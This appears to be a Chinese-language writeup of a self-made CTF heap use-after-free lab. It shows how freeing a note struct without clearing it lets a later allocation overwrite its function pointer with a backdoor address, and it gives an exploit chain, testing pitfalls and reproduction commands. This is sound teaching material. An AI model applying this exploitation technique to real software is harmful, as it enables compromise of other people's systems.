# lab_heap_uaf —— 自造 heap UAF 靶场（L6，函数指针 UAF）

> **这是自造实验，不是真实赛题。** 目的：把 `heap_uaf` 这一类的核心动作
> （free 后结构体仍被引用 → 重新分配到旧结构体上 → 改函数指针 → 调 stale 指针）
> 做成一个**确定性、无 ASLR 依赖**的最小靶子，和真实题 `hitcontraining_uaf` 对齐。

---

## 1. 题目行为

```text
struct note { char *data; void (*fn)(char *); };   ← 注意成员顺序：data 在前

1. add    index / size / data   先 malloc(size) 读入 data，再 malloc(0x10) 存结构体
2. edit   index / data          read(0, notes[index]->data, sizes[index])  ← UAF 写
3. free   index                 free(data); free(notes[index]);  不清空 notes[index]
4. show   index                 notes[index]->fn(notes[index]->data)     ← 调 stale 函数指针
```

保护（`checksec`）：

| 项 | 值 |
| --- | --- |
| 架构 | amd64，动态链接，glibc 2.43 |
| PIE | 无（基址 `0x400000`） |
| canary | 有（`-fstack-protector-strong`） |
| NX | 开启 |
| RELRO | Partial |

```text
backdoor   0x401256    puts + system("cat flag.txt")
chunk 尺寸  size=0x18 的 data 与 struct note(16B) 都落在 0x20 这个 size class
```

## 2. 为什么是 heap_uaf（而不是 tcache poisoning）

| 排除项 | 原因 |
| --- | --- |
| tcache poisoning | 需要泄漏 heap 地址（safe-linking key）；本 lab 刻意做成**不需要泄漏**的最小例子 |
| fastbin dup | 需要 double free，而 2.29+ 有 `key` 检测 |
| 栈溢出 | 全程没有栈操作 |

本 lab 只演示“**重占旧对象 + 改函数指针**”这一个动作，便于和真实题对照。

## 3. 利用链

```text
add(0, 0x18, "A"*0x18)      # data=A, struct=S0
add(1, 0x18, "B"*0x18)      # data=C, struct=S1
free(0)                     # free(A) → free(S0)   tcache[0x20] = S0, A
free(1)                     # free(C) → free(S1)   tcache[0x20] = S1, C, S0, A
add(2, 0x18, p64(0) + p64(backdoor) + "C"*8)
                            # data 先分配，拿到队首 S1 → 正好盖掉 note1 的结构体
show(1)                     # stale notes[1] = S1 → fn(data) = backdoor()
```

关键：`add` 里 **data 先于 struct 分配**，所以“下一个 data”会拿到“上一个 struct”，
这就是本 lab 唯一的技巧点。

## 4. 坑点（本次实测踩到的）

1. **结构体成员顺序写反会崩在 `fn = 0`**：`struct note` 是 `{data, fn}`，payload 必须是
   `p64(<arg>) + p64(backdoor)`；我第一次写成 `{fn, data}`，现象是
   `0x0000000000000000 in ?? ()` 由 `show_note` 调出，`rdi = backdoor`（参数被当成 data）。
2. **data 必须和 struct 同 size class**：`size=0x18` → `0x20` chunk，才能和 16 字节的
   `struct note` 共用 tcache bin；换个 size 复用顺序就全变。
3. **菜单读入必须逐字节读到 `\n`**：一开始用 `read(0, b, 15)` 一次读，会把后端已到达的
   下一次输入一起吞掉（残留 `\n` + 新输入竞争），现象是莫名 `bad size` / `??` 并 desync。
4. **exp 发 data 用 `sendafter` 而不是 `sendlineafter`**：定长 `read` 场景下多出来的
   `\n` 会变成下一次菜单输入，虽然多数时候能自愈，但会让调试信息很脏。
5. `-O0 -fno-pie -no-pie`：保证 `backdoor` 地址固定、且编译器不会把 `notes[]` 清零。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn Writeups/labs/lab_heap_uaf'
source ../../.venv/bin/activate
make
printf '__PWNED__{uaf_ok}\n' > flag.txt
python exp.py                          # 期望输出 __PWNED__{uaf_ok}
```

文件：`chal`（`make` 产物，ELF 64 位）+ `exp.py` + `src/chal.c`。
EXP 默认 `process('./chal')`；想跑远程时用
`socat TCP-LISTEN:10006,reuseaddr,fork EXEC:./chal` 起服务，再
`HOST=127.0.0.1 PORT=10006 python exp.py`（两个环境变量都支持）。

## 6. 识别卡

```text
delete 只 free 不清空 + show/print 会通过结构体里的函数指针调用
  -> heap_uaf：让下一次 malloc 复用旧结构体的 chunk，直接写 {arg, fn}
先看结构体成员顺序和分配顺序（data 先还是 struct 先），复用顺序由 tcache LIFO 决定
```

> 与真实题的关系：`hitcontraining_uaf`（本题库 `heap_uaf/14_*`）就是同一模式：
> note 结构体里存 `print_note` 函数指针，free 后不清空 → 重占 → 改成 `magic`/后门。
